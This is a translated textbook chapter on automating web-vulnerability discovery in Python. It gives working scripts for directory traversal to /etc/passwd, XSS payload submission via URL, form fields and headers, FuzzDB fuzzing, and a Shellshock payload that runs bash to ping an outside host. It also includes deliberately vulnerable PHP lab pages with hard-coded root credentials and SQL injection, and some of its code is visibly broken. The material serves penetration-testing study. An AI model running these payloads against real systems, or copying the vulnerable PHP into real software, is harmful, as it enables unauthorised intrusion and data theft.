# 第三章：漏洞识别

在本章中，我们将涵盖以下主题：

+   自动化基于 URL 的目录遍历

+   自动化跨站脚本（参数和 URL）

+   自动化基于参数的跨站脚本

+   自动模糊测试

+   jQuery 检查

+   基于头部的跨站脚本

+   Shellshock 检查

# 介绍

本章重点介绍从**开放式 Web 应用安全项目**（**OWASP**）的前 10 个传统 Web 应用程序漏洞。这将包括**跨站脚本**（**XSS**），目录遍历以及那些简单到不需要单独章节检查的其他漏洞。本章提供了每个脚本的基于参数和基于 URL 的版本，以适应任何情况并减少单个脚本的复杂性。大多数这些工具都有完全成熟的替代方案，比如 Burp Intruder。看到每个工具以其简单的 Python 形式的好处在于，它让你了解如何构建和制作自己的版本。

# 自动化基于 URL 的目录遍历

偶尔，网站使用不受限制的函数调用文件；这可能导致传说中的目录遍历或**直接对象引用**（**DOR**）。在这种攻击中，用户可以通过使用一个易受攻击的参数在网站的上下文中调用任意文件。这可以通过两种方式进行操纵：首先，通过提供绝对链接，比如`/etc/passwd`，这表示从`root`目录浏览到`etc`目录并打开`passwd`文件，其次，相对链接，可以向上遍历目录以达到`root`目录并访问目标文件。

我们将创建一个脚本，尝试逐渐增加 URL 参数中的向上目录数量，以打开 Linux 机器上始终存在的文件`/etc/passwd`。它将通过检测到指示文件已被打开的短语 root 来确定何时成功。

## 准备工作

确定您要测试的 URL 参数。此脚本已配置为与大多数设备一起使用：`etc/passwd`应该适用于 OSX 和 Linux 安装，`boot.ini`应该适用于 Windows 安装。查看本示例的末尾，以获取可用于测试脚本有效性的 PHP 网页。

我们将使用可以通过`pip`安装的 requests 库。在作者看来，它在功能和可用性方面比`urllib`更好。

## 如何做…

一旦确定要攻击的参数，请将其作为命令行参数传递给脚本。您的脚本应与以下脚本相同：

```py
import requests
import sys
url = sys.argv[1]
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
up = "../"
i = 0
for payload, string in payloads.iteritems():
  for i in xrange(7):
    req = requests.post(url+(i*up)+payload)
    if string in req.text:
      print "Parameter vulnerable\r\n"
      print "Attack string: "+(i*up)+payload+"\r\n"
      print req.text
      break
```

使用此脚本时产生的输出示例如下：

```py
Parameter vulnerable

Attack string: ../../../../../etc/passwd

Get me /etc/passwd! File Contents:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

## 它是如何工作的…

我们导入我们在本书中到目前为止所需的库，就像我们做的其他脚本一样：

```py
url = sys.argv[1]
```

然后，我们以 URL 的形式输入。由于我们使用`requests`库，我们应该确保我们的 URL 与 requests 期望的形式匹配，即`http(s)://url`。如果你搞错了，requests 会提醒你：

```py
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
```

我们建立我们将在每次攻击中发送的有效载荷的字典。每对中的第一个值是我们希望尝试加载的文件，第二个值是肯定会在该文件中的值。第二个值越具体，错误报告就会越少；但是，这可能会增加错误否定的机会。请随意在这里包含你自己的文件：

```py
up = "../"
i = 0
```

我们提供向上目录的快捷方式`../`并将其分配给向上变量，并将我们的循环计数器设置为`0`：

```py
for payload, string in payloads.iteritems():
  while i < 7:
```

`Iteritems`方法允许我们遍历字典并将每个键和值分配给变量。我们将第一个值分配为负载，第二个值分配为字符串。然后我们限制我们的循环，以防失败时无限重复。我将其设置为`7`，尽管这可以设置为任何您喜欢的值。请记住，Web 应用程序的目录结构可能高于`7`的可能性：

```py
req = requests.post(url+(i*up)+payload)
```

我们通过获取我们的根 URL，并根据循环和负载的当前数量附加上级目录的当前数量来构建我们的请求。然后将其发送到一个 post 请求中：

```py
if string in req.text:
      print "Parameter vulnerable\r\n"
      print "Attack string: "+(i*up)+payload+"\r\n"
      print req.text
      break
```

我们通过查看响应中是否包含我们预期的字符串来检查是否已经实现了我们的目标。如果字符串存在，我们将停止循环，并打印出攻击字符串以及成功攻击的响应。这样可以让我们手动验证攻击是否成功，或者代码是否需要重构，或者 Web 应用程序是否存在漏洞。

```py
    i = i+1
  i = 0
```

最后，计数器将添加到每个循环，直到达到预设的最大值。一旦达到最大值，它将被设置为下一个攻击字符串。

## 还有更多

这个方法可以通过应用本书其他地方展示的原则来适应通过参数工作。但是，由于页面通过参数调用的罕见性和故意的简洁性，这一点没有提供。

正如前面提到的，这可以通过添加额外的文件及其常见的字符串来扩展。一旦已经确定了目录遍历和到达根目录所需的深度，也可以扩展到抓取所有有趣的文件。

以下是一个 PHP 网页，可以让您在自己的构建上测试此脚本。只需将其放在您的`var/www`目录或您使用的其他解决方案中。不要在未知网络上保持此活动状态：

```py
<?php
echo "Get me /etc/passwd! File Contents";
if (!isset($_REQUEST['id'])){
header( 'Location: /traversal/first.php?id=1' ) ;
}
if (isset($_REQUEST['id'])){
  if ($_REQUEST['id'] == "1"){
    $file = file_get_contents("data.html", true);
    echo $file;}

else{
  $file = file_get_contents($_REQUEST['id']);
  echo $file;
}
}?>
```

# 自动化基于 URL 的跨站脚本攻击

反射型跨站脚本攻击通常通过基于 URL 的参数发生。你应该知道什么是跨站脚本攻击，如果你不知道，我为你感到尴尬。真的吗？我必须解释这个？好吧。跨站脚本攻击是将 JavaScript 注入到页面中。这是黑客入门课程，也是大多数人遇到或听说的第一种攻击。阻止跨站脚本攻击的低效方法主要集中在针对脚本标签，而脚本标签并不是在页面中使用 JavaScript 的必要条件，因此有许多绕过方法。

我们将创建一个脚本，采用各种标准的规避技术，并使用`Requests`库将它们应用于自动提交。我们将知道脚本是否成功，因为要么脚本本身，要么它的早期版本将出现在提交后的页面上。

## 如何做…

我们将使用的脚本如下：

```py
import requests
import sys
url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
for payload in payloads:
  req = requests.post(url+payload)
  if payload in req.text:
    print "Parameter vulnerable\r\n"
    print "Attack string: "+payload
    print req.text
    break
```

使用此脚本时产生的输出示例如下：

```py
Parameter vulnerable

Attack string: <script>alert(1);</script>

Give me XSS:
<script>alert(1);</script>
```

## 工作原理…

这个脚本类似于之前的目录遍历脚本。这次我们创建一个负载列表，而不是字典，因为检查字符串和负载是相同的：

```py
payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
```

然后，我们使用与之前相似的循环来逐个提交这些值：

```py
for payload in payloads:
  req = requests.post(url+payload)
```

每个负载都被附加到我们的 URL 的末尾，以便作为未结束的参数发送，例如`127.0.0.1/xss/xss.php?comment=`。负载将被添加到该字符串的末尾，以便形成一个有效的语句。然后我们检查该字符串是否出现在以下页面中：

```py
if payload in req.text:
    print "Parameter vulnerable\r\n"
    print "Attack string: "+payload
    print req.text
    break
```

跨站脚本攻击非常简单，非常容易自动化和检测，因为攻击字符串通常与结果相同。与目录遍历或 SQLi（稍后我们将遇到）的困难在于结果并不总是可预测的。而在成功的跨站脚本攻击中，它是可预测的。

## 还有更多…

这种攻击可以通过提供更多的攻击字符串来扩展。许多示例可以在 Mozilla FuzzDB 中找到，我们将在*自动模糊*部分脚本中使用。此外，可以使用原始的`urllib`库应用各种编码形式，这在本书的各种不同示例中都有展示。

# 自动参数化跨站脚本

我已经说过跨站脚本非常容易。有趣的是，以脚本方式执行存储的跨站脚本略微困难。我可能应该在这一点上收回我先前的话，但无论如何。这里的困难在于系统通常从一个页面接受输入结构，提交到另一个页面，并返回第三个页面。以下脚本旨在处理这种最复杂的结构。

我们将创建一个脚本，它接受三个输入值，正确读取并提交所有三个值，并检查是否成功。它与之前基于 URL 的跨站脚本共享代码，但在执行上有根本的不同。

## 如何操作…

以下脚本是功能测试。这是一个脚本，旨在在类似 Sublime Text 或 IDE 的框架中手动编辑，因为存储的 XSS 可能需要调整：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
initial = requests.get(url)
for payload in payloads:
  d = {}
  for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name'):
            if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
  req = requests.post(url2, data=d)
  checkresult = requests.get(url3)

  if payload in checkresult.text:
    print "Full string returned"
    print "Attack string: "+ payload
```

以下是使用此脚本时产生的输出示例，其中包含两个成功的字符串：

```py
Full string returned
Attack string: <script>alert(1);</script>
Full string returned
Attack string: <BODY ONLOAD=alert(1)>
```

## 它是如何工作的…

我们导入我们的库作为时间和时间之前，并建立我们要攻击的 URL。在这里，`url`是带有要攻击的参数的页面，`url2`是要提交内容的页面，`url3`是要读取的最终页面，以便检测攻击是否成功。其中一些 URL 可能是共享的。它们以这种形式设置，因为很难为存储的跨站脚本制作点对点脚本：

```py
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
```

然后，我们建立一个负载列表。与基于 URL 的 XSS 脚本一样，负载和检查值是相同的：

```py
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
```

然后，我们创建一个空字典，将负载与每个识别的输入框配对：

```py
d = {}
```

我们的目标是攻击页面中的每个输入参数，因此接下来，我们读取我们的目标页面：

```py
initial = requests.get(url)
```

然后，我们为我们在负载列表中放置的每个值创建一个循环：

```py
for payload in payloads:
```

然后，我们使用`BeautifulSoup`处理页面，这是一个允许我们根据标签和定义特征来切割页面的库。我们使用它来识别每个输入字段，以便选择名称，以便我们可以发送内容：

```py
for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name'):
```

由于大多数网页中输入框的性质，任何名为`submit`的字段都不应被用于跨站脚本攻击，而是需要给予`submit`作为值，以便我们的攻击成功。我们创建一个`if`函数来检测是否是这种情况，使用`.lower()`函数轻松地考虑可能使用的大写值。如果该字段不用于验证提交，我们将其填充为当前使用的负载：

```py
if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
```

我们通过使用`requests`库将我们现在分配的值发送到目标页面的 post 请求中，就像我们之前做的那样：

```py
req = requests.post(url2, data=d)
```

然后加载将呈现我们内容的页面，并准备好用于检查结果函数：

```py
checkresult = requests.get(url3)
```

与之前的脚本类似，我们通过搜索页面上的字符串来检查我们的字符串是否成功，并在成功时打印结果。然后，我们为下一个负载重置字典：

```py
if payload in checkresult.text:
    print "Full string returned"
    print "Attack string: "+ payload
  d = {}
```

## 还有更多…

与之前一样，您可以修改此脚本以包含许多结果或从包含多个值的文件中读取。正如下面的示例中所示，Mozilla 的 FuzzDB 包含大量这些值。

以下是可以用来测试前面部分提供的脚本的设置。它们需要保存为提供的文件名才能正常工作，并与 MySQL 数据库一起使用以存储评论。

以下是名为`guestbook.php`的第一个接口页面：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}
?>

<form id="contact_form" action='addguestbook.php' method="post">
  <label>Name: <input class="textfield" name="name" type="text" value="" /></label>
  <label>Comment: <input class="textfield" name="comment" type="text" value="" /></label>
  <input type="submit" name="Submit" value="Submit"/> 
</form>

<strong><a href="viewguestbook.php">View Guestbook</a></strong>
```

以下脚本是`addguestbook.php`，它将您的评论放入数据库中：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('0','$name', '$comment', '$cookie')";

$result=mysql_query($sql);

if($result){
  echo "Successful";
  echo "<BR>";
  echo "<h1>Hi</h1>";

echo "<a href='viewguestbook.php'>View Guestbook</a>";
}

else{
  echo "ERROR";
}
mysql_close();
?>
```

最终脚本是`viewguestbook.php`，它从数据库中获取评论：

```py
<html>

<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>

<h1>Comments</h1>

<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid'])){
  setcookie("sessionid", $my_rand, "10000000000", "/xss/easy/");}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="SELECT * FROM guestbook WHERE session = '$cookie'";";

$result=mysql_query($sql);

while($field = mysql_fetch_assoc($result)) {

  print "Name: " . $field['name'] . "\t";
  print "Comment: " . $field['comment'] . "<BR>\r\n";
}

mysql_close();
?>
```

# 自动模糊

Fuzzing 是黑客社区的破坏和抢劫。它侧重于向页面发送大量无效内容并记录结果。这是 SQL 注入的败类版本，可以说是渗透测试的基本形式（尽管你们 LOIC 用户可能是生命形式的基本形式）。

我们将创建一个脚本，它将从 FuzzDB 元字符文件中获取值，并将它们发送到每个可用的参数，并记录所有结果。这绝对是一种暴力尝试来识别漏洞，并需要一个明智的人来查看结果。

## 准备工作

为此，您将需要来自 Mozilla 的 FuzzDB。在印刷时，可以从[`code.google.com/p/fuzzdb/`](https://code.google.com/p/fuzzdb/)获取。对于此脚本，您需要`fuzzdb` TAR 文件中的`/fuzzdb-1.09/attack-payloads/all-attacks/interesting-metacharacters.txt`文件。我正在重用用于概念验证的 XSS 脚本的测试 PHP 脚本，但您可以针对任何您喜欢的内容使用此脚本。目标是触发错误。

## 如何做…

脚本如下：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"

f =  open("/home/cam/Downloads/fuzzdb-1.09/attack-payloads/all- attacks/interesting-metacharacters.txt")
o = open("results.txt", 'a')

print "Fuzzing begins!"

initial = requests.get(url)
for payload in f.readlines():
  for field in BeautifulSoup(initial.text,  parse_only=SoupStrainer('input')):
  d = {}

          if field.has_attr('name'):
            if field['name'].lower() == "submit":
             d[field['name']] = "submit"
            else:
             d[field['name']] = payload
  req = requests.post(url2, data=d)
  response = requests.get(url3)

  o.write("Payload: "+ payload +"\r\n")
  o.write(response.text+"\r\n")

print "Fuzzing has ended"
```

以下是使用此脚本时产生的输出示例：

```py
Fuzzing has begun!
Fuzzing has ended
```

## 它是如何工作的…

我们导入我们的库。由于这是一个测试脚本，我们在代码中建立我们的 URL：

```py
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
```

然后我们打开两个文件。第一个将是 FuzzDB 元字符文件。我包含了我的路径，但在您的工作目录中复制该文件也是可以接受的。第二个文件将是您要写入的文件：

```py
f =  open("/home/cam/Downloads/fuzzdb-1.09/attack-payloads/all-attacks/interesting-metacharacters.txt")
o = open("results.txt", 'a')
```

我们创建一个空字典，用于存储我们的参数和攻击字符串：

```py
d = {}
```

由于脚本将其输出写入文件，我们需要提供一些文本来显示脚本正在运行，因此我们写了一条简单而友好的消息：

```py
print "Fuzzing begins!"
```

我们读取接受输入的原始页面并赋给一个变量：

```py
initial = requests.get(url)
```

我们使用`BeautifilSoup`分离页面并识别我们想要的唯一字段，即输入字段和名称字段：

```py
for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
          if field.has_attr('name')@~:
```

我们需要再次检查是否提供了名为 submit 的字段，并将`submit`作为数据，否则我们应用我们的攻击字符串：

```py
if field['name'].lower() == "submit":
              d[field['name']] = "submit"
            else:
              d[field['name']] = payload
```

我们首先提交一个`POST`请求，发送攻击字符串映射到输入字段的字典，然后我们从显示输出的页面请求一个`GET`请求（在第三页之前可能会出现一些错误，因此您应该相应地进行限制）：

```py
req = requests.post(url2, data=d)
  response = requests.get(url3)
```

由于输出会很长而且混乱，我们将输出写入最初打开的文件，以便人类可以轻松审查：

```py
o.write("Payload: "+ payload +"\r\n")
o.write(response.text+"\r\n")
```

我们重置字典以供下一个攻击字符串使用，然后为了清晰起见，向用户提供脚本结束的输出：

```py
d = {}
print "Fuzzing has ended"
```

## 还有更多…

您可以不断添加内容到这个脚本中。它被设计为适用于多种类型的输入和攻击。FuzzDB 包含许多不同的攻击字符串，因此所有这些都可以应用。我鼓励您去探索。

## 另请参阅

您可以像我一样针对存储的 XSS PHP 页面进行测试。

# jQuery 检查

OWASP 十大漏洞中较少被检查但更严重的一个是使用已知漏洞的库或模块。这通常意味着过时的 web 框架版本，但也包括执行特定功能的 JavaScript 库。在这种情况下，我们正在检查 jQuery；我已经用这个脚本检查了其他库，但为了举例，我将坚持使用 jQuery。

我们将创建一个脚本，用于识别网站是否使用 jQuery，获取其版本号，然后将其与最新版本号进行比较，以确定是否为最新版本。

## 如何做…

以下是我们的脚本：

```py
import requests
import re
from bs4 import BeautifulSoup
import sys

scripts = []

if len(sys.argv) != 2:
  print "usage: %s url" % (sys.argv[0])
  sys.exit(0)

tarurl = sys.argv[1]
url = requests.get(tarurl)
soup = BeautifulSoup(url.text)
for line in soup.find_all('script'):
  newline = line.get('src')
  scripts.append(newline)

for script in scripts:
  if "jquery.min" in str(script).lower():
    url = requests.get(script)
    versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)
    if versions[0] == "2.1.1" or versions[0] == "1.12.1":
      print "Up to date"
    else:
      print "Out of date"
      print "Version detected: "+versions[0]
```

以下是使用此脚本时产生的输出示例：

```py
http://candycrate.com
Out of Date
Version detected: 1.4.2
```

## 它是如何工作的…

像往常一样，我们导入我们的库并创建一个空库，用于存放我们未来识别的脚本：

```py
scripts = []
```

对于这个脚本，我们创建了一个简单的使用指南，用于检测是否已提供 URL。它读取`sys.argv`的数量，如果不等于`2`，包括脚本本身，则打印出指南：

```py
if len(sys.argv) != 2:
  print "usage: %s url" % (sys.argv[0])
  sys.exit(0)
```

我们从`sys.argv`列表中获取目标 URL 并打开它：

```py
tarurl = sys.argv[1]
url = requests.get(tarurl)
```

与之前一样，我们使用 beautiful soup 来拆分页面；但是，这次我们正在识别脚本并提取它们的`src`值，以获取正在使用的`js`库的 URL。这将收集所有可能是 jQuery 的潜在库。请记住，如果您扩展使用范围以包括不同类型的库，这个 URL 列表可能非常有用：

```py
for line in soup.find_all('script'):
  newline = line.get('src')
  scripts.append(newline)
```

对于每个识别的脚本，我们然后检查是否有任何`jquery.min`的提及，这将指示核心 jQuery 文件：

```py
for script in scripts:
  if "jquery.min" in str(script).lower():
```

然后我们使用正则表达式来识别版本号。在 jQuery 文件中，这将是符合给定正则表达式的第一件事。正则表达式寻找`0-9`或`a-z`后跟一个无限次数重复的句点。这是大多数版本号采用的格式，jQuery 也不例外：

```py
versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)
```

`re.findall`方法找到与此正则表达式匹配的所有字符串；但是，正如前面提到的，我们只想要第一个。我们用注释`[0]`来标识它。我们检查是否等于当前 jQuery 版本的硬编码值，在撰写时。这些将需要手动更新。如果该值等于当前版本中的任何一个，脚本将声明其为最新版本，否则，它将打印检测到的版本以及过期消息：

```py
if versions[0] == "2.1.1" or versions[0] == "1.12.1":
      print "Up to date"
    else:
      print "Out of date"
      print "Version detected: "+versions[0]
```

## 还有更多…

这个配方显然是可扩展的，可以通过简单地添加检测字符串和版本来应用到任何 JavaScript 库。

如果要扩展该字符串以包括其他库，比如不安全的 Django 或 flask 库，脚本将不得不进行修改，以处理它们声明的替代方式，因为它们显然不是声明为 JavaScript 库。

# 基于标头的跨站脚本

到目前为止，我们已经专注于通过 URL 和参数发送有效载荷，这是执行攻击的两种明显方法。然而，通常有许多丰富和肥沃的漏洞来源往往被忽视。其中之一将在第六章中深入介绍，*图像分析和操作*，现在我们可以先简单介绍一下。通常会记录访问网页的用户的特定标头。通过在标头中执行 XSS 攻击来执行这些日志的检查可能是一项值得的活动。

我们将创建一个脚本，向所有可用的标头提交 XSS 攻击字符串，并循环执行几种可能的 XSS 攻击。我们将提供一个简短的有效载荷列表，抓取所有标头，并依次提交它们。

## 准备工作

识别您希望测试的 URL。请参见本示例末尾的 PHP 网页，脚本可以用来测试脚本的有效性。

## 如何做…

一旦您确定了目标网页，将其作为命令行参数传递给脚本。您的脚本应该与下面的脚本中所示的相同：

```py
import requests
import sys
url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY  ONLOAD=alert(1)>']
headers ={}
r = requests.head(url)
for payload in payloads:
  for header in r.headers:
    headers[header] = payload
  req = requests.post(url, headers=headers)
```

脚本不会提供任何输出，因为它针对的是功能的管理员端。但是，您可以轻松地设置它在每个循环中提供输出：

```py
Print "Submitted "+payload
```

这将每次返回以下内容：

```py
Submitted <script>alert(1);</script>
```

## 工作原理…

我们导入我们脚本所需的库，并以`sys.argv`函数的形式输入。你应该对这一点相当熟悉了。

再次，我们可以将我们的有效载荷声明为列表，而不是字典，因为我们将它们与网页提供的值配对。我们还创建一个空字典来容纳我们未来的攻击配对：

```py
payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
headers ={}
```

然后，我们对网页进行`HEAD`请求，仅返回我们正在攻击的页面的标头。虽然`HEAD`请求可能被禁用，但这种可能性很小；但是，如果是这样，我们可以将其替换为标准的`GET`请求：

```py
r = requests.head(url)
```

我们循环遍历之前设置的有效载荷和从前面的`HEAD`请求中提取的标头：

```py
for payload in payloads:
  for header in r.headers:
```

对于每个有效载荷和标头，我们将它们添加到之前设置的空字典中，作为一对：

```py
headers[header] = payload
```

对于每个有效载荷的迭代，我们然后提交所有具有该有效载荷的标头，因为显然我们无法提交每个标头的多个：

```py
req = requests.post(url, headers=headers)
```

由于攻击的活动部分发生在管理员的客户端，因此需要使用管理员帐户手动检查，或者需要联系管理员以查看攻击是否在日志链的任何位置激活。

## 另请参阅

以下是可用于测试前面脚本的设置。这与用于 XSS 检查的早期脚本非常相似。这里的区别在于传统的 XSS 方法将由于`strip_tags`函数而失败。它演示了需要使用非常规方法执行攻击的情况。显然，在注释中返回用户代理是虚构的，尽管这在野外很常见。它们需要保存为提供的文件名以便与 MySQL 数据库一起工作，并存储评论。

以下是名为`guestbook.php`的第一个界面页面：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}
?>

<form id="contact_form" action='addguestbook.php' method="post">
  <label>Name: <input class="textfield" name="name" type="text" value="" /></label>
  <label>Comment: <input class="textfield" name="comment" type="text" value="" /></label>
  <input type="submit" name="Submit" value="Submit"/> 
</form>

<strong><a href="viewguestbook.php">View Guestbook</a></strong>
```

以下脚本是`addguestbook.php`，它将您的评论放入数据库：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid4'];

$unsanname = $_REQUEST['name'];
$unsan = $_REQUEST['comment'];
$comment = addslashes($unsan);
$name = addslashes($unsanname);

#echo "$comment";

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('0','$name', '$comment', '$cookie')";

$result=mysql_query($sql);

if($result){
  echo "Successful";
  echo "<BR>";

echo "<a href='viewguestbook.php'>View Guestbook</a>";
}

else{
  echo "ERROR";
}
mysql_close();
?>
```

最终脚本是`viewguestbook.php`，它从数据库中提取评论：

```py
<?php

$my_rand = rand();

if (!isset($_COOKIE['sessionid4'])){
  setcookie("sessionid4", $my_rand, "10000000000", "/xss/vhard/");
}

$host='localhost';
$username='root';
$password='password';
$db_name="xss";
$tbl_name="guestbook";

$cookie = $_COOKIE['sessionid4'];

$name = $_REQUEST['name'];
$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="SELECT * FROM guestbook WHERE session = '$cookie'";

$result=mysql_query($sql);

echo "<h1>Comments</h1>\r\n";

while($field = mysql_fetch_assoc($result)) {
  $trimmedname = strip_tags($field['name']);
  $trimmedcomment = strip_tags($field['comment']);
  echo "<a>Name: " . $trimmedname . "\t";
  echo "Comment: " . $trimmedcomment . "</a><BR>\r\n";
  }

echo "<!--" . $_SERVER['HTTP_USER_AGENT'] . "-->";

mysql_close();
?>
```

# Shellshock 检查

摆脱对 Web 服务器的标准攻击方式，我们将快速查看 Shellshock，这是一个漏洞，允许攻击者通过特定标头执行 shell 命令。这个漏洞在 2014 年出现，并迅速成为当年最大的漏洞之一。虽然现在它大部分已经修复，但它是 Web 服务器可以被操纵执行更复杂攻击的一个很好的例子，并且可能在未来的**常见传输文件**（CTF）中成为频繁的目标。

我们将创建一个脚本，该脚本会拉取页面的标头，识别易受攻击的标头是否存在，并向该标头提交一个示例有效载荷。此脚本依赖于外部基础设施来支持此攻击以收集受损设备的呼叫。

## 准备工作

确定您要测试的 URL。一旦确定了目标网页，将其作为`sys.argv`传递给脚本：

## 如何做…

您的脚本应该与以下脚本相同：

```py
import requests
import sys
url = sys.argv[1]
payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
headers ={}
r = requests.head(url)
for header in r.headers:
  if header == "referer" or header == "User-Agent": 
    headers[header] = payload
req = requests.post(url, headers=headers)
```

该脚本不会提供输出，因为它针对的是功能的管理员端。但是，您可以轻松地设置它在每次循环时提供输出：

```py
Print "Submitted "+payload
```

这将每次返回以下内容：

```py
Submitted <script>alert(1);</script>
```

## 它是如何工作的…

我们导入了此脚本所需的库，并以`sys.argv`函数的形式接受输入。这有点重复，但它完成了工作。

我们将我们的有效载荷声明为一个单一实体。如果您希望对服务器执行多个操作，可以将其设置为有效载荷，类似于前面的操作。我们还为我们的标头-有效载荷组合创建一个空字典，并向目标 URL 发出`HEAD`请求：

```py
payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
headers ={}
r = requests.head(url)
```

此处设置的有效载荷将 ping 您在`<url/ip>`空间设置的任何服务器。它将在该 ping 中发送一条消息，即`pwnt`。这使您能够确定服务器实际上已被攻破，而不仅仅是一个随机服务器。

然后，我们遍历我们在初始的`HEAD`请求中提取的每个标头，并检查是否有`referrer`或`User-Agent`标头，这些标头容易受到 Shellshock 攻击。如果存在这些标头，我们对该标头发送我们的攻击字符串：

```py
for header in r.headers:
  if header == "referer" or header == "User-Agent": 
    headers[header] = payload
```

一旦我们确定了我们的标头是否存在，并已设置了针对它们的攻击字符串，我们就发出请求。如果成功，消息应该出现在我们的日志中：

```py
req = requests.post(url, headers=headers)
```
